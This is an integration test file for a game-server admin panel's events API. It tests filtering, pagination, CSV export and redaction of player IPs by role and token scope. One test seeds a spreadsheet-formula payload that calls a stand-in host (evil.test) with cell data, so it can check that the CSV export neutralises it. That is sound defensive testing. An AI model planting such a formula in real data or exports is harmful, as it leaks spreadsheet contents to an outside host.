import type { DatabaseClient } from '@squad/db';
import { events, playerApiTokens, players, roles, servers } from '@squad/db/schema';
import { sql } from 'drizzle-orm';
import { v7 as uuidv7 } from 'uuid';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { mintApiToken } from '../src/lib/api-tokens.js';
import { invalidatePermissionCache } from '../src/lib/rbac.js';
import { createSession } from '../src/lib/sessions.js';
import {
  buildIntegrationApp,
  type IntegrationHarness,
  makeFakeBridge,
} from './integration/harness.js';

const describeIfDb = process.env.DATABASE_URL ? describe : describe.skip;

const STEAM_RUN_BASE = 76561198100000000n + BigInt(Date.now() % 1_000_000_000);
const OWNER_STEAM_ID = STEAM_RUN_BASE + 1_000_000n;
let steamCounter = STEAM_RUN_BASE;
function nextSteam(): bigint {
  steamCounter += 1n;
  return steamCounter;
}

async function seedRole(
  db: DatabaseClient,
  opts: { panelAccess?: boolean; canViewIps?: boolean } = {},
): Promise<string> {
  const id = uuidv7();
  await db.insert(roles).values({
    id,
    name: `Role-${id}`,
    color: 'neutral',
    isSystemRole: false,
    panelAccess: opts.panelAccess ?? true,
    canViewIps: opts.canViewIps ?? false,
  });
  return id;
}

async function seedPlayer(
  db: DatabaseClient,
  opts: { name?: string; roleId?: string | null; eosOnly?: boolean } = {},
): Promise<string> {
  const id = uuidv7();
  const name = opts.name ?? `Player-${id.slice(0, 8)}`;
  await db.insert(players).values({
    id,
    steamId64: opts.eosOnly ? null : nextSteam(),
    eosId: opts.eosOnly ? `eos-${id}` : null,
    canonicalName: name,
    canonicalNameNormalized: name.toLowerCase(),
    roleId: opts.roleId ?? null,
  });
  return id;
}

async function seedServer(db: DatabaseClient, name: string): Promise<string> {
  const id = uuidv7();
  await db.insert(servers).values({
    id,
    displayName: name,
    slug: `${name.toLowerCase().replace(/[^a-z0-9]/g, '-')}-${id}`,
  });
  return id;
}

interface SeedEventOpts {
  serverId: string | null;
  occurredAt: Date;
  kind?: string;
  actorKind?: string | null;
  actorId?: string | null;
  correlationId?: string | null;
  payload?: unknown;
}

async function seedEvent(db: DatabaseClient, opts: SeedEventOpts): Promise<string> {
  const id = uuidv7();
  await db.insert(events).values({
    eventId: id,
    serverId: opts.serverId,
    occurredAt: opts.occurredAt,
    kind: opts.kind ?? 'player.connected',
    version: 1,
    actorKind: opts.actorKind ?? null,
    actorId: opts.actorId ?? null,
    correlationId: opts.correlationId ?? null,
    payload: opts.payload ?? { name: 'Rifleman', steam_id64: '76561198000000000' },
  });
  return id;
}

async function loginAs(h: IntegrationHarness, playerId: string): Promise<string> {
  invalidatePermissionCache(playerId);
  const { token } = await createSession(h.db, h.redis, {
    playerId,
    ip: null,
    userAgent: 'events-test',
    ttlMs: 21_600_000,
  });
  return `__Host-sid=${token}`;
}

interface EventDto {
  event_id: string;
  server_id: string | null;
  server_name: string | null;
  server_slug: string | null;
  occurred_at: string;
  kind: string;
  version: number;
  actor_kind: string | null;
  actor_id: string | null;
  actor_nickname: string | null;
  correlation_id: string | null;
}

interface ListResponse {
  items: EventDto[];
  next_cursor: string | null;
  limit: number;
}

interface EnvelopeResponse {
  event_id: string;
  version: number;
  type: string;
  server_id: string | null;
  ts: string;
  actor: { kind: string | null; id: string | null } | null;
  actor_nickname: string | null;
  correlation_id: string | null;
  payload: unknown;
}

// Occurred timestamps live inside bootstrapped monthly partitions (current + 5 months).
const BASE = new Date();
BASE.setUTCDate(2);
BASE.setUTCHours(10, 0, 0, 0);
function at(offsetMinutes: number): Date {
  return new Date(BASE.getTime() + offsetMinutes * 60_000);
}

describeIfDb('events API (EVT-2)', () => {
  let h: IntegrationHarness;
  let cookie: string;

  beforeAll(async () => {
    h = await buildIntegrationApp({
      seedOwner: { steamId64: OWNER_STEAM_ID },
      bridge: makeFakeBridge(),
      reusePublicSchema: true,
    });
    // biome-ignore lint/style/noNonNullAssertion: seedOwner guarantees ownerPlayerId
    cookie = await loginAs(h, h.seed.ownerPlayerId!);
  });

  afterAll(async () => {
    await h.cleanup();
  });

  async function listEvents(qs: string): Promise<ListResponse> {
    const res = await h.app.inject({
      method: 'GET',
      url: `/api/v1/events${qs}`,
      headers: { cookie },
    });
    expect(res.statusCode).toBe(200);
    return res.json() as ListResponse;
  }

  async function paginateIds(qsBase: string, limit: number): Promise<string[]> {
    const collected: string[] = [];
    let cursor: string | null = null;
    for (let guard = 0; guard < 100; guard += 1) {
      const cursorParam = cursor ? `&cursor=${encodeURIComponent(cursor)}` : '';
      const page = await listEvents(`${qsBase}&limit=${limit}${cursorParam}`);
      collected.push(...page.items.map((event) => event.event_id));
      if (!page.next_cursor) break;
      cursor = page.next_cursor;
    }
    return collected;
  }

  it('rejects unauthenticated access with 401', async () => {
    for (const url of ['/api/v1/events', '/api/v1/events/count', `/api/v1/events/${uuidv7()}`]) {
      const res = await h.app.inject({ method: 'GET', url });
      expect(res.statusCode).toBe(401);
    }
  });

  it('rejects players without panel_access with 401', async () => {
    const noAccessRole = await seedRole(h.db, { panelAccess: false });
    const player = await seedPlayer(h.db, { roleId: noAccessRole });
    const deniedCookie = await loginAs(h, player);
    for (const url of ['/api/v1/events', '/api/v1/events/count', `/api/v1/events/${uuidv7()}`]) {
      const res = await h.app.inject({ method: 'GET', url, headers: { cookie: deniedCookie } });
      expect(res.statusCode).toBe(401);
      expect(res.json()).toMatchObject({ error: 'unauthenticated' });
    }
  });

  it('combines server, kind, player and date filters (AC)', async () => {
    const server = await seedServer(h.db, 'EvtFilterSrv');
    const otherServer = await seedServer(h.db, 'EvtOtherSrv');
    const rambo = await seedPlayer(h.db, { name: `Rambo-${uuidv7().slice(0, 6)}` });
    const ghost = await seedPlayer(h.db, { name: `Ghost-${uuidv7().slice(0, 6)}` });

    const target = await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(10),
      kind: 'player.connected',
      actorKind: 'system',
      actorId: rambo,
    });
    await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(20),
      kind: 'player.disconnected',
      actorId: ghost,
    });
    await seedEvent(h.db, {
      serverId: otherServer,
      occurredAt: at(15),
      kind: 'player.connected',
      actorId: rambo,
    });
    await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(-1000),
      kind: 'player.connected',
      actorId: rambo,
    });

    const byServerKind = await listEvents(
      `?serverId=${server}&kind=player.connected&dateFrom=${encodeURIComponent(at(0).toISOString())}`,
    );
    expect(byServerKind.items.map((event) => event.event_id)).toEqual([target]);
    expect(byServerKind.items[0]?.actor_nickname).toContain('Rambo');
    expect(byServerKind.items[0]?.server_name).toBe('EvtFilterSrv');

    const byPlayer = await listEvents(
      `?serverId=${server}&playerId=${rambo}&dateFrom=${encodeURIComponent(at(0).toISOString())}&dateTo=${encodeURIComponent(at(1000).toISOString())}`,
    );
    expect(byPlayer.items.map((event) => event.event_id)).toEqual([target]);

    const combined = await listEvents(
      `?serverId=${server}&kind=player.connected&playerId=${rambo}&dateFrom=${encodeURIComponent(at(0).toISOString())}&dateTo=${encodeURIComponent(at(1000).toISOString())}`,
    );
    expect(combined.items.map((event) => event.event_id)).toEqual([target]);
  });

  it('accepts multiple kind values (multi-select)', async () => {
    const server = await seedServer(h.db, 'EvtMultiKindSrv');
    const connected = await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(30),
      kind: 'player.connected',
    });
    const ended = await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(31),
      kind: 'match.ended',
    });
    await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(32),
      kind: 'rcon.players_polled',
    });

    const filtered = await listEvents(`?serverId=${server}&kind=player.connected&kind=match.ended`);
    expect(new Set(filtered.items.map((event) => event.event_id))).toEqual(
      new Set([connected, ended]),
    );
  });

  it('searches player by nickname, including EOS-only players', async () => {
    const server = await seedServer(h.db, 'EvtNickSrv');
    const uniqueNick = `Xenon-${uuidv7().slice(0, 8)}`;
    const eosPlayer = await seedPlayer(h.db, { name: uniqueNick, eosOnly: true });
    const decoy = await seedPlayer(h.db, { name: `Decoy-${uuidv7().slice(0, 6)}` });

    const wanted = await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(40),
      actorId: eosPlayer,
    });
    await seedEvent(h.db, { serverId: server, occurredAt: at(41), actorId: decoy });

    const found = await listEvents(`?serverId=${server}&playerQuery=${uniqueNick.slice(0, 6)}`);
    expect(found.items.map((event) => event.event_id)).toEqual([wanted]);
    expect(found.items[0]?.actor_nickname).toBe(uniqueNick);

    const none = await listEvents(`?serverId=${server}&playerQuery=zzz-no-such-nick`);
    expect(none.items).toEqual([]);
  });

  // Audit #118 — the query is normalised like the stored name, so a search
  // that carries a clan tag still finds the player.
  it('searches player by a nickname typed with a clan tag', async () => {
    const server = await seedServer(h.db, 'EvtClanTagSrv');
    const uniqueNick = `Krypton-${uuidv7().slice(0, 8)}`;
    const player = await seedPlayer(h.db, { name: uniqueNick });
    const wanted = await seedEvent(h.db, { serverId: server, occurredAt: at(42), actorId: player });

    const query = encodeURIComponent(`[TAG]  ${uniqueNick.slice(0, 10)}`);
    const found = await listEvents(`?serverId=${server}&playerQuery=${query}`);
    expect(found.items.map((event) => event.event_id)).toEqual([wanted]);
  });

  it('sorts by occurred_at in both directions', async () => {
    const server = await seedServer(h.db, 'EvtSortSrv');
    const early = await seedEvent(h.db, { serverId: server, occurredAt: at(50) });
    const mid = await seedEvent(h.db, { serverId: server, occurredAt: at(51) });
    const late = await seedEvent(h.db, { serverId: server, occurredAt: at(52) });

    const desc = await listEvents(`?serverId=${server}&order=desc`);
    expect(desc.items.map((event) => event.event_id)).toEqual([late, mid, early]);

    const asc = await listEvents(`?serverId=${server}&order=asc`);
    expect(asc.items.map((event) => event.event_id)).toEqual([early, mid, late]);
  });

  it('keyset paginates together with a filter and sort (AC)', async () => {
    const server = await seedServer(h.db, 'EvtPageSrv');
    const ascending: string[] = [];
    for (let index = 0; index < 7; index += 1) {
      const id = await seedEvent(h.db, {
        serverId: server,
        occurredAt: at(60 + index),
        kind: 'player.connected',
      });
      ascending.push(id);
    }
    await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(70),
      kind: 'match.ended',
    });

    const paged = await paginateIds(`?serverId=${server}&kind=player.connected&order=asc`, 2);
    expect(paged).toEqual(ascending);
    expect(new Set(paged).size).toBe(ascending.length);
  });

  it('rejects a malformed cursor with 400', async () => {
    const res = await h.app.inject({
      method: 'GET',
      url: '/api/v1/events?cursor=not-a-real-cursor',
      headers: { cookie },
    });
    expect(res.statusCode).toBe(400);
    expect(res.json()).toMatchObject({ error: 'invalid_cursor' });
  });

  it('neutralises spreadsheet formulas in the CSV export (#154)', async () => {
    const server = await seedServer(h.db, 'EvtCsvFormulaSrv');
    const formulaNick = `=HYPERLINK("http://evil.test/?"&A1,"x${uuidv7().slice(0, 6)}")`;
    const actor = await seedPlayer(h.db, { name: formulaNick });
    await seedEvent(h.db, { serverId: server, occurredAt: at(85), actorId: actor });

    const res = await h.app.inject({
      method: 'GET',
      url: `/api/v1/events/export?serverId=${server}`,
      headers: { cookie },
    });
    expect(res.statusCode).toBe(200);
    expect(res.body).toContain(`"'${formulaNick.replace(/"/g, '""')}"`);
    expect(res.body).not.toContain(`,"${formulaNick.replace(/"/g, '""')}"`);
  });

  it('exports every matching row newest first across export batches', async () => {
    const server = await seedServer(h.db, 'EvtCsvBatchSrv');
    const total = 1_203;
    await h.db.insert(events).values(
      Array.from({ length: total }, (_, index) => ({
        eventId: uuidv7(),
        serverId: server,
        occurredAt: new Date(at(90).getTime() + index * 1_000),
        kind: 'player.connected',
        version: 1,
        payload: { seq: index },
      })),
    );

    const res = await h.app.inject({
      method: 'GET',
      url: `/api/v1/events/export?serverId=${server}`,
      headers: { cookie },
    });
    expect(res.statusCode).toBe(200);
    const lines = res.body.trimEnd().split('\r\n');
    expect(lines).toHaveLength(total + 1);
    const seqs = lines.slice(1).map((line) => Number(/seq"":(\d+)/.exec(line)?.[1]));
    expect(seqs[0]).toBe(total - 1);
    expect(seqs.at(-1)).toBe(0);
    expect(new Set(seqs).size).toBe(total);
  });

  it('rejects a cursor whose event id is 36 characters but not a UUID with 400, not 500', async () => {
    const forged = Buffer.from(`${at(0).toISOString()}~${'-'.repeat(36)}`, 'utf-8').toString(
      'base64url',
    );
    const res = await h.app.inject({
      method: 'GET',
      url: `/api/v1/events?cursor=${forged}`,
      headers: { cookie },
    });
    expect(res.statusCode).toBe(400);
    expect(res.json()).toMatchObject({ error: 'invalid_cursor' });
  });

  it('counts events honoring filters', async () => {
    const server = await seedServer(h.db, 'EvtCountSrv');
    await seedEvent(h.db, { serverId: server, occurredAt: at(80), kind: 'player.connected' });
    await seedEvent(h.db, { serverId: server, occurredAt: at(81), kind: 'match.started' });

    const res = await h.app.inject({
      method: 'GET',
      url: `/api/v1/events/count?serverId=${server}&kind=player.connected`,
      headers: { cookie },
    });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({ total: 1 });
  });

  it('counts an unfiltered feed exactly while the table is small', async () => {
    const res = await h.app.inject({
      method: 'GET',
      url: '/api/v1/events/count',
      headers: { cookie },
    });
    expect(res.statusCode).toBe(200);
    const [row] = (await h.db.execute(
      sql`SELECT count(*)::int AS total FROM events`,
    )) as unknown as Array<{ total: number }>;
    expect(res.json()).toEqual({ total: row?.total, estimated: false });
  });

  it('answers an unfiltered count on a large table with the planner estimate (#152)', async () => {
    const execute = vi
      .spyOn(h.db, 'execute')
      .mockResolvedValueOnce([{ estimate: 12_345_678 }] as never);
    try {
      const res = await h.app.inject({
        method: 'GET',
        url: '/api/v1/events/count',
        headers: { cookie },
      });
      expect(res.statusCode).toBe(200);
      expect(res.json()).toEqual({ total: 12_345_678, estimated: true });
    } finally {
      execute.mockRestore();
    }
  });

  it('indexes the feed order, the rule filter and nickname search (#152, #153, #1325)', async () => {
    const rows = (await h.db.execute(sql`
      SELECT indexname FROM pg_indexes
      WHERE schemaname = current_schema()
        AND indexname IN (
          'events_occurred_at_event_id_idx',
          'events_rule_id_idx',
          'players_canonical_name_normalized_trgm_idx',
          'player_name_history_name_normalized_trgm_idx'
        )
    `)) as unknown as Array<{ indexname: string }>;
    expect(rows.map((row) => row.indexname).sort()).toEqual([
      'events_occurred_at_event_id_idx',
      'events_rule_id_idx',
      'player_name_history_name_normalized_trgm_idx',
      'players_canonical_name_normalized_trgm_idx',
    ]);
  });

  it('resolves actor nicknames without failing on non-uuid actor ids', async () => {
    const server = await seedServer(h.db, 'EvtActorIdSrv');
    const actor = await seedPlayer(h.db, { name: `Medic-${uuidv7().slice(0, 6)}` });
    const withPlayer = await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(95),
      actorId: actor,
    });
    const withLabel = await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(96),
      actorKind: 'system',
      actorId: 'scheduler',
    });

    const page = await listEvents(`?serverId=${server}`);
    const byId = new Map(page.items.map((event) => [event.event_id, event]));
    expect(byId.get(withPlayer)?.actor_nickname).toContain('Medic-');
    expect(byId.get(withLabel)?.actor_nickname).toBeNull();
  });

  it('returns the raw envelope with payload (AC)', async () => {
    const server = await seedServer(h.db, 'EvtEnvSrv');
    const actor = await seedPlayer(h.db, { name: `Cap-${uuidv7().slice(0, 6)}` });
    const correlationId = uuidv7();
    const payload = { steam_id64: '76561198000000123', eos_id: null, name: 'Medic', ip: null };
    const eventId = await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(90),
      kind: 'player.connected',
      actorKind: 'system',
      actorId: actor,
      correlationId,
      payload,
    });

    const res = await h.app.inject({
      method: 'GET',
      url: `/api/v1/events/${eventId}`,
      headers: { cookie },
    });
    expect(res.statusCode).toBe(200);
    const envelope = res.json() as EnvelopeResponse;
    expect(envelope.event_id).toBe(eventId);
    expect(envelope.type).toBe('player.connected');
    expect(envelope.server_id).toBe(server);
    expect(envelope.actor).toMatchObject({ kind: 'system', id: actor });
    expect(envelope.actor_nickname).toContain('Cap');
    expect(envelope.correlation_id).toBe(correlationId);
    expect(envelope.payload).toEqual(payload);
  });

  it('returns 404 for an unknown event id', async () => {
    const res = await h.app.inject({
      method: 'GET',
      url: `/api/v1/events/${uuidv7()}`,
      headers: { cookie },
    });
    expect(res.statusCode).toBe(404);
    expect(res.json()).toMatchObject({ error: 'event_not_found' });
  });

  it('exports filtered events as CSV (P1)', async () => {
    const server = await seedServer(h.db, 'EvtCsvSrv');
    const withComma = await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(100),
      kind: 'player.connected',
      payload: { name: 'Comma, Man', steam_id64: '76561198000000999' },
    });
    await seedEvent(h.db, {
      serverId: server,
      occurredAt: at(101),
      kind: 'match.started',
    });

    const res = await h.app.inject({
      method: 'GET',
      url: `/api/v1/events/export?serverId=${server}&kind=player.connected`,
      headers: { cookie },
    });
    expect(res.statusCode).toBe(200);
    expect(res.headers['content-type']).toContain('text/csv');
    expect(res.headers['content-disposition']).toContain('attachment');
    const body = res.body;
    const lines = body.trim().split('\r\n');
    expect(lines[0]).toBe(
      'event_id,server_id,server_name,occurred_at,kind,version,actor_kind,actor_id,actor_nickname,correlation_id,payload',
    );
    expect(lines).toHaveLength(2);
    expect(lines[1]).toContain(withComma);
    expect(body).toContain('"Comma, Man"');
  });

  it('streams an export spanning several keyset batches with every row exactly once, newest first', async () => {
    const server = await seedServer(h.db, 'EvtCsvBatchSrv');
    const total = 2_505;
    const ids: string[] = [];
    const rows = Array.from({ length: total }, (_, i) => {
      const eventId = uuidv7();
      ids.push(eventId);
      // Pairs share a timestamp so the event_id tie-break is exercised at batch edges.
      return {
        eventId,
        serverId: server,
        occurredAt: new Date(at(200).getTime() + Math.floor(i / 2) * 1_000),
        kind: 'player.connected',
        version: 1,
        payload: { n: i },
      };
    });
    for (let i = 0; i < rows.length; i += 500) {
      await h.db.insert(events).values(rows.slice(i, i + 500));
    }

    const res = await h.app.inject({
      method: 'GET',
      url: `/api/v1/events/export?serverId=${server}`,
      headers: { cookie },
    });
    expect(res.statusCode).toBe(200);
    const lines = res.body.trim().split('\r\n');
    expect(lines).toHaveLength(total + 1);
    const exported = lines.slice(1).map((line) => line.split(',')[0] as string);
    expect(new Set(exported).size).toBe(total);
    expect(new Set(exported)).toEqual(new Set(ids));
    const stamps = lines.slice(1).map((line) => Date.parse(line.split(',')[3] as string));
    for (let i = 1; i < stamps.length; i += 1) {
      expect(stamps[i] as number).toBeLessThanOrEqual(stamps[i - 1] as number);
    }
  });

  describe('ruleId filter (BANNAME-3 — «Срабатывания» per banned-name rule)', () => {
    it('list/count/export only return events whose payload.rule_id matches (AC)', async () => {
      const server = await seedServer(h.db, 'EvtRuleFilterSrv');
      const ruleA = uuidv7();
      const ruleB = uuidv7();
      const matchA = await seedEvent(h.db, {
        serverId: server,
        occurredAt: at(200),
        kind: 'banname.matched',
        payload: { player_id: uuidv7(), rule_id: ruleA, nickname: 'BadNickA', action: 'kick' },
      });
      await seedEvent(h.db, {
        serverId: server,
        occurredAt: at(201),
        kind: 'banname.matched',
        payload: { player_id: uuidv7(), rule_id: ruleB, nickname: 'BadNickB', action: 'kick' },
      });
      await seedEvent(h.db, {
        serverId: server,
        occurredAt: at(202),
        kind: 'player.connected',
        payload: { name: 'Someone', steam_id64: '76561198000001111' },
      });

      const list = await listEvents(`?serverId=${server}&ruleId=${ruleA}`);
      expect(list.items.map((event) => event.event_id)).toEqual([matchA]);

      const combinedWithKind = await listEvents(
        `?serverId=${server}&kind=banname.matched&ruleId=${ruleA}`,
      );
      expect(combinedWithKind.items.map((event) => event.event_id)).toEqual([matchA]);

      const countRes = await h.app.inject({
        method: 'GET',
        url: `/api/v1/events/count?serverId=${server}&ruleId=${ruleA}`,
        headers: { cookie },
      });
      expect((countRes.json() as { total: number }).total).toBe(1);

      const exportRes = await h.app.inject({
        method: 'GET',
        url: `/api/v1/events/export?serverId=${server}&ruleId=${ruleA}`,
        headers: { cookie },
      });
      expect(exportRes.statusCode).toBe(200);
      const exportLines = exportRes.body.trim().split('\r\n');
      expect(exportLines).toHaveLength(2);
      expect(exportLines[1]).toContain(matchA);
    });

    it('rejects unauthenticated access with 401', async () => {
      const res = await h.app.inject({
        method: 'GET',
        url: `/api/v1/events?ruleId=${uuidv7()}`,
      });
      expect(res.statusCode).toBe(401);
    });
  });

  // #10 (finding #147): the journal must honour `events:view` (and therefore a
  // token's scopes) and must not hand player IPs to callers that lack
  // `player:view_ips`.
  describe('sensitive data gating (#10)', () => {
    const PLAYER_IP = '203.0.113.77';
    let serverId: string;
    let connectedEventId: string;

    beforeAll(async () => {
      serverId = await seedServer(h.db, 'EvtIpGateSrv');
      connectedEventId = await seedEvent(h.db, {
        serverId,
        occurredAt: at(300),
        kind: 'player.connected',
        payload: {
          steam_id64: '76561198000002222',
          eos_id: null,
          name: 'IpCarrier',
          ip: PLAYER_IP,
        },
      });
    });

    async function tokenHeader(playerId: string, scopes: string[]): Promise<string> {
      const minted = mintApiToken();
      await h.db.insert(playerApiTokens).values({
        id: minted.id,
        playerId,
        name: `events-test-${minted.id.slice(0, 8)}`,
        tokenHash: minted.tokenHash,
        scopes,
      });
      invalidatePermissionCache(playerId);
      return `Bearer ${minted.plaintext}`;
    }

    async function fetchEnvelope(headers: Record<string, string>) {
      return h.app.inject({
        method: 'GET',
        url: `/api/v1/events/${connectedEventId}`,
        headers,
      });
    }

    async function fetchExport(headers: Record<string, string>) {
      return h.app.inject({
        method: 'GET',
        url: `/api/v1/events/export?serverId=${serverId}&kind=player.connected`,
        headers,
      });
    }

    it('redacts player IPs from the envelope and the CSV export without player:view_ips', async () => {
      const moderatorRole = await seedRole(h.db, { panelAccess: true, canViewIps: false });
      const moderator = await seedPlayer(h.db, { roleId: moderatorRole });
      const moderatorCookie = await loginAs(h, moderator);

      const envelope = await fetchEnvelope({ cookie: moderatorCookie });
      expect(envelope.statusCode).toBe(200);
      const body = envelope.json() as EnvelopeResponse;
      expect(body.payload).toMatchObject({ name: 'IpCarrier', ip: null });
      expect(envelope.body).not.toContain(PLAYER_IP);

      const csv = await fetchExport({ cookie: moderatorCookie });
      expect(csv.statusCode).toBe(200);
      expect(csv.body).toContain(connectedEventId);
      expect(csv.body).not.toContain(PLAYER_IP);
    });

    it('keeps player IPs for callers holding player:view_ips', async () => {
      const ipRole = await seedRole(h.db, { panelAccess: true, canViewIps: true });
      const ipViewer = await seedPlayer(h.db, { roleId: ipRole });
      const ipViewerCookie = await loginAs(h, ipViewer);

      const envelope = await fetchEnvelope({ cookie: ipViewerCookie });
      expect(envelope.statusCode).toBe(200);
      expect((envelope.json() as EnvelopeResponse).payload).toMatchObject({ ip: PLAYER_IP });

      const csv = await fetchExport({ cookie: ipViewerCookie });
      expect(csv.statusCode).toBe(200);
      expect(csv.body).toContain(PLAYER_IP);
    });

    it('rejects an API token whose scopes lack events:view on every events route', async () => {
      // biome-ignore lint/style/noNonNullAssertion: seedOwner guarantees ownerPlayerId
      const authorization = await tokenHeader(h.seed.ownerPlayerId!, ['host:view']);
      for (const url of [
        '/api/v1/events',
        '/api/v1/events/count',
        '/api/v1/events/export',
        `/api/v1/events/${connectedEventId}`,
      ]) {
        const res = await h.app.inject({ method: 'GET', url, headers: { authorization } });
        expect(res.statusCode, url).toBe(403);
        expect(res.body).not.toContain(PLAYER_IP);
      }
    });

    it('redacts player IPs from the live server event stream without player:view_ips', async () => {
      await h.redis.xadd(
        `events:server:${serverId}`,
        '*',
        'envelope',
        JSON.stringify({
          event_id: uuidv7(),
          version: 1,
          type: 'player.connected',
          server_id: serverId,
          ts: new Date().toISOString(),
          actor: { kind: 'system', id: null },
          correlation_id: null,
          payload: {
            steam_id64: '76561198000002222',
            eos_id: null,
            name: 'IpCarrier',
            ip: PLAYER_IP,
          },
        }),
      );
      const url = `/api/v1/servers/${serverId}/events?limit=10`;

      const moderatorRole = await seedRole(h.db, { panelAccess: true, canViewIps: false });
      const moderator = await seedPlayer(h.db, { roleId: moderatorRole });
      const hidden = await h.app.inject({
        method: 'GET',
        url,
        headers: { cookie: await loginAs(h, moderator) },
      });
      expect(hidden.statusCode).toBe(200);
      expect(hidden.body).toContain('IpCarrier');
      expect(hidden.body).not.toContain(PLAYER_IP);

      // biome-ignore lint/style/noNonNullAssertion: seedOwner guarantees ownerPlayerId
      const serverViewToken = await tokenHeader(h.seed.ownerPlayerId!, ['server:view']);
      const narrow = await h.app.inject({
        method: 'GET',
        url,
        headers: { authorization: serverViewToken },
      });
      expect(narrow.statusCode).toBe(200);
      expect(narrow.body).not.toContain(PLAYER_IP);

      const ipRole = await seedRole(h.db, { panelAccess: true, canViewIps: true });
      const ipViewer = await seedPlayer(h.db, { roleId: ipRole });
      const visible = await h.app.inject({
        method: 'GET',
        url,
        headers: { cookie: await loginAs(h, ipViewer) },
      });
      expect(visible.statusCode).toBe(200);
      expect(visible.body).toContain(PLAYER_IP);
    });

    it('lets an events:view token read the journal but redacts IPs unless it also holds player:view_ips', async () => {
      // biome-ignore lint/style/noNonNullAssertion: seedOwner guarantees ownerPlayerId
      const ownerId = h.seed.ownerPlayerId!;
      const eventsOnly = await tokenHeader(ownerId, ['events:view']);
      const narrow = await fetchEnvelope({ authorization: eventsOnly });
      expect(narrow.statusCode).toBe(200);
      expect((narrow.json() as EnvelopeResponse).payload).toMatchObject({ ip: null });

      const withIps = await tokenHeader(ownerId, ['events:view', 'player:view_ips']);
      const wide = await fetchEnvelope({ authorization: withIps });
      expect(wide.statusCode).toBe(200);
      expect((wide.json() as EnvelopeResponse).payload).toMatchObject({ ip: PLAYER_IP });
    });
  });
});
